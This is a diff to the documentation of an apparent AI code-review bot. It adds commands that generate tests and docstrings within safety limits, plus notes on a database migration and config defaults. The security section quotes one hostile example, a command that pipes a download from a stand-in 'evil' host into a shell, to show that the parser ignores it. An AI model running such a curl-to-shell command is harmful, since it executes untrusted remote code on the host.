@@ -112,6 +112,107 @@ discovered during an incident.
 The order is deterministic — most severe first, then oldest first — so which
 findings a limit selects does not depend on row order.
 
+## Finishing touches: tests and docstrings
+
+On the pull request:
+
+```
+@mira generate tests          # aliases: generate unit tests, tests, unit tests
+@mira generate docstrings     # aliases: generate docs, docstrings
+```
+
+Neither is a second pipeline. A finishing touch is an autofix job with a
+different **job kind** (`fix`, `tests` or `docstrings`, persisted on the job
+row), so it goes through everything a fix does, in the same order: the mode,
+the kill switch and the per-repository opt-in; the requester's write
+permission; the durable queue and its idempotent key; path safety, protected
+paths and the file/line/byte limits on the applied result; redaction;
+structured output with no field that can carry a command; validation against
+the deployment's allowlist; the last read before the first write; delivery as
+Mira's own branch and stacked pull request (or `--on-branch`, behind the same
+`allow_commit_to_pr_branch` opt-in); the CI retry loop. `--handoff` is refused:
+a finishing touch is written by Mira or not at all.
+
+Each is **off on its own** until a deployment turns it on, and neither means
+anything while autofix itself is off:
+
+```yaml
+autofix:
+  mode: "on"                 # or "suggest" to see the patch without a write
+  finishing_touches:
+    tests: true              # default false
+    docstrings: true         # default false
+  repositories:
+    acme/app:
+      finishing_touches:     # replaces the global block for this repository
+        tests: false
+        docstrings: true
+```
+
+The toggle is consulted when the request arrives, when the job runs and again
+immediately before anything is written, so turning one off stops queued work
+the way the kill switch does.
+
+**Scope is the pull request's diff, never the repository.** Only files the
+pull request changed are tested or documented, at the commit the request was
+made on. Changed tests, documentation, configuration and generated output are
+left out and counted in the reply; protected paths are left out by name; files
+past `max_files` are left out with that reason. Words after the command —
+`generate tests for utils.py` — are ignored rather than read as a scope.
+
+### What `generate tests` may write
+
+Test files, and nothing else. Mira reads the tree at the head commit to learn
+where this repository keeps its tests and what it writes them with — a `tests/`
+root or tests beside the code, `test_x.py` or `x_test.py`, `.test.ts` or
+`.spec.ts`, `__tests__/`, `src/test/java` mirroring `src/main/java`, `_test.go`
+next to the source — and offers the model an explicit list per changed source
+file: the existing tests that look like they cover it, plus one new file where a
+test for it belongs. The source under test is shown as read-only context.
+
+An edit to any path outside that list is refused before it is applied
+(`not_a_test_file`), including the source under test. Creating files and
+editing files outside the diff is what writing tests *is*, so for these
+offered paths alone `allow_new_files` and `restrict_to_changed_files` are
+relaxed; protected paths and every size limit apply unchanged. An existing test
+file is extended by quoting it, never replaced wholesale. A path is offered as
+*new* only when the repository tree confirms it does not exist: some providers
+answer a failed read with an empty body, and a file wrongly taken for new would
+be overwritten.
+
+### What `generate docstrings` may write
+
+Documentation, and nothing else, on public functions and classes the pull
+request changed.
+
+- **Python** is checked on the syntax tree. With every docstring stripped, the
+  module before and after must be identical — a changed operator, a reordered
+  function or a new import is `behaviour_changed`. Every docstring that changed
+  must belong to a public function or class (no leading underscore, nothing but
+  classes enclosing it) whose lines the pull request touched; a module
+  docstring, a private helper or an untouched function is `out_of_scope`.
+  Removing a docstring is refused. Comments may change.
+- **JavaScript, TypeScript, Go, Rust, Java, Kotlin, C, C++, C#, Swift, Scala,
+  Dart, Objective-C, PHP, Ruby, shell, Perl, R and Lua** get a deliberately
+  blunter check: every line the patch adds or removes must be blank or wholly a
+  comment, tracked through `/* … */` blocks, and an unchanged line that the
+  patch turns into a comment is refused too.
+- Any other language is not offered: a check Mira cannot perform is not a check.
+
+### The reply
+
+Always says what happened: queued with the job key, what is in scope (`src/x.py
+→ tests/test_x.py (new)`, or `src/x.py (parse, Parser)`), what was left out and
+why, and whether the repository is in `suggest` mode — or why nothing was
+started: autofix off, the toggle off (naming the key that turns it on), no
+write permission, nothing to test, nothing to document, the queue full, or the
+same request already finished at this commit.
+
+Branches are `<branch_prefix>/pr-<number>/<kind>-<head sha>`, commits carry a
+`Mira-Task: tests|docstrings` trailer instead of `Mira-Finding`, and the stacked
+pull request is titled `test: …` or `docs: …`. The dashboard's job list shows
+each job's kind and filters on it (`GET /api/autofix/jobs?job_kind=tests`).
+
 ## Who may ask
 
 A fix is written on the requester's behalf, so the permission checked is the
@@ -498,6 +599,11 @@ Migrations are additive. Both stores run `CREATE TABLE IF NOT EXISTS` on every
 connection, so an existing database picks the tables up on the next start with
 no migration step and no downtime.
 
+`autofix_jobs.job_kind` (`fix`, `tests` or `docstrings`) arrived after the
+table did. Both stores add it on open — `ALTER TABLE … ADD COLUMN` behind a
+`PRAGMA table_info` check on SQLite, `ADD COLUMN IF NOT EXISTS` on Postgres —
+with a default of `fix`, which is what every row written before it was.
+
 On Postgres, where one table holds every repository, rows carry the **namespaced**
 owner (`_{platform}/{owner}` for anything but GitHub) because that is the
 spelling every read scopes on. The store's own owner therefore wins over the one
@@ -657,6 +763,10 @@ autofix:
     options: {}
     fallback_when_refused: false
 
+  finishing_touches:                 # `@mira generate tests` / `generate docstrings`
+    tests: false
+    docstrings: false
+
   repositories: {}                   # per-repo overrides, keyed owner/repo
 ```
 
@@ -680,8 +790,8 @@ autofix:
 
 Nothing in a pull request. Not its title, body, diff, labels, comments, CI logs
 or the model's own response. The command parser reads only the words Mira
-defined — a verb, `all`, and three modifiers — and extracts no arguments from
-free text at all. `@mira fix --exec /bin/sh -c 'curl evil | sh'` parses to
+defined — a verb, `all`, and three modifiers, plus `generate` and its two
+targets — and extracts no arguments from free text at all. `@mira fix --exec /bin/sh -c 'curl evil | sh'` parses to
 exactly `fix`.
 
 The validation allowlist, the limits, the requester lists and the branch prefix
